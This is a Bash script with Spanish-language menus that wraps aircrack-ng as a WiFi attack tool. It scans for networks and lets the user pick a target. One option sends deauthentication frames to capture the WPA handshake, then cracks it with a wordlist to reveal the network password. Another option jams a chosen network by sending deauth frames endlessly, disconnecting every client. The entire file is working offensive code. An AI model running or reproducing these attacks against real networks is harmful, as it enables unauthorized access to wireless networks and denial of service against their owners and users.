#!/bin/bash

clear
Red="\e[1;91m"      ##### Colors Used #####
Green="\e[0;92m"
Yellow="\e[0;93m"
Blue="\e[1;94m"
White="\e[0;97m"

handshakeWait=2        ##### Mide cuánto tiempo espera aircack-ng el apretón de manos en un minuto #####

checkDependencies () {        ##### Compruebe si aircrack-ng está instalado o no #####
if [ $(dpkg-query -W -f='${Status}' aircrack-ng 2>/dev/null | grep -c "ok installed") -eq 0 ]; then
echo "Installing aircrack-ng\n\n"
sudo apt-get install aircrack-ng;
fi
}

checkWiFiStatus () {        ##### Compruebe si wlan0 está habilitado o no #####
WiFiStatus=`nmcli radio wifi`
if [ "$WiFiStatus" == "disabled" ]; then
nmcli radio wifi on
echo -e "[${Green}wlan0${White}] Habilitado!"
fi
}

banner () {        ##### Banner #####
echo -e "${Red}

██╗███╗   ██╗███╗   ██╗███████╗██████╗ 
██║████╗  ██║████╗  ██║██╔════╝██╔══██╗
██║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
██║██║ ╚████║██║ ╚████║███████╗██║  ██║
╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
                                       
                                                       "
echo -e "${Yellow} \n                    Un script poderoso para aircrack-ng, pirateo de wifi.
               El script solo funciona si su adaptador wifi tiene modo monitor"
echo -e "${Green}\n                         Creado por: Spik"
echo -e "${Green}                         Version: 3.8 Estable"
}

menu () {        ##### Mostrar opciones disponibles #####
echo -e "\n${Yellow}                 [ Seleccione la opción para continuar ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}WiFi Hacker"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Bloquear WiFi"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Salir\n\n"
while true; do
echo -e "${Green}┌─[${Red}Seleccionar opción${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Seleccionado${White}] Opcion 1 WiFi Hacker..."
     wifiHacking
     ;;
  2) echo -e "\n[${Green}Seleccionado${White}] Opcion 2 Bloquear WiFi..."
     wifiJammer
     exit 0
     ;;
  3) echo -e "${Red}\n\033[1mGracias por utilizar nuestra herramienta :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Seleccione la opción correcta...\n"
     ;;
esac
done
}

wifiHacking () {        ##### Envío de DeAuth y apretón de manos de captura #####
monitor
airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake wlan0mon > /dev/null &
echo -e "[${Green}wlan0mon${White}] Envío de DeAuth al objetivo..."
x-terminal-emulator -e aireplay-ng --deauth 20 -a $bssid wlan0mon
wordlist
echo -e "[${Green}Estado${White}] Esperando paquete de protocolo de enlacet..."
counter=0
while true; do
sleep 10
echo -e "[${Green}Estado${White}] Comprobación del paquete de protocolo de enlace..."
aircrack-ng -w $fileLocation handshake-01.cap > logs/password 2> logs/error
if [ $? -eq 0 ] || [ $counter -eq $(($handshakeWait*3)) ]; then
break
fi
sleep 10
echo -e "[${Red}!${White}] No puedo encontrar el apretón de manos, esperando ..."
counter=$((counter+1))
done
kill $!
airmon-ng stop wlan0mon > /dev/null
rm handshake-01.cap
if grep "unable" logs/error > /dev/null; then
echo -e "[${Red}$targetName${White}] Al salir no se puede encontrar el paquete de protocolo de enlace..."
sleep 0.5
echo -e "[${Yellow}Advertencia${White}] Asegúrese de que al menos un cliente esté conectado a la red..."
exit 1
elif grep "NOT" logs/password > /dev/null; then
echo -e "[${Green}$targetName${White}] Apretón de manos capturado..."
sleep 0.5
echo -e "[${Red}$targetName${White}] No puedo encontrar la contraseña..."
sleep 0.5
echo -e "[${Yellow}Advertencia${White}] Intente usar una lista de palabras personalizada..."
exit 1
elif grep "FOUND!" logs/password > /dev/null; then
key=$(grep "FOUND!" logs/password | cut -d " " -f4 | uniq)
echo -e "[${Green}$targetName${White}] Apretón de manos capturado..."
sleep 0.5
echo -e "[${Green}$targetName${White}] La contraseña de la red es: \e[4;97m$key${White}\n"
exit 0
else
echo -e "[${Red}!${White}] Se produjo un error desconocido..."
sleep 0.5
echo -e "[${Yellow}Spik${White}] Puedes discutir en https://hacker-world.foroactivo.com/"
echo -e "[${Yellow}Spik${White}] Pegue el contenido de la contraseña y los archivos de registro de errores..."
exit 1
fi
}

wordlist () {        ##### Ingrese la ruta a la lista de palabras o use el predeterminado #####
read -p $'[\e[0;92mInput\e[0;97m] Ruta a la lista de palabras (Presione enter para usar default): ' fileLocation
if [ -z "$fileLocation" ]; then
fileLocation="${parameter:-dictionary/palabras.txt}"
return 0
elif [[ -f "$fileLocation" ]]; then
return 0
fi
echo -e "[${Red}!$White] El archivo no existe..."
wordlist
}

wifiJammer () {        ##### Envío ilimitado de DeAuth #####
monitor
airodump-ng --bssid $bssid --channel $channel wlan0mon > /dev/null & sleep 5 ; kill $!  
echo -e "[${Green}${targetName}${White}] DoS iniciado, todos los dispositivos desconectados... "
sleep 0.5
echo -e "[${Green}DoS${White}] Presione ctrl + c para detener el ataque y salir..."
aireplay-ng --deauth 0 -a $bssid wlan0mon > /dev/null
}

monitor () {        ##### Monitorear el modo, escanear las redes disponibles y seleccionar el objetivo #####
spinner &
airmon-ng start wlan0 > /dev/null
trap "airmon-ng stop wlan0mon > /dev/null;rm generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT
airodump-ng --output-format kismet --write generated wlan0mon > /dev/null & sleep 20 ; kill $!
sed -i '1d' generated-01.kismet.csv
kill %1
echo -e "\n\n${Red}Número de serie       WiFi Network${White}"
cut -d ";" -f 3 generated-01.kismet.csv | nl -n ln -w 8
targetNumber=1000
while [ ${targetNumber} -gt `wc -l generated-01.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber} -lt 1 ]; do 
echo -e "\n${Green}┌─[${Red}Seleccione un objetivo${Green}]──[${Red}~${Green}]─[${Yellow}Red${Green}]:"
read -p "└─────►$(tput setaf 7) " targetNumber
done
targetName=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 3 `
bssid=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 4 `
channel=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 6 `
rm generated-01.kismet.csv 2> /dev/null
echo -e "\n[${Green}${targetName}${White}] Preparándose para el ataque..."
}

spinner() {        ##### Animación al buscar redes disponibles #####
sleep 2
echo -e "[${Green}wlan0mon${White}] Preparándose para escanear..."
sleep 3
spin='/-\|'
length=${#spin}
while sleep 0.1; do
echo -ne "[${Green}wlan0mon${White}] Escaneo de redes disponibles...${spin:i--%length:1}" "\r"
done
}

inner () {
checkDependencies
checkWiFiStatus
banner
menu
}

inner
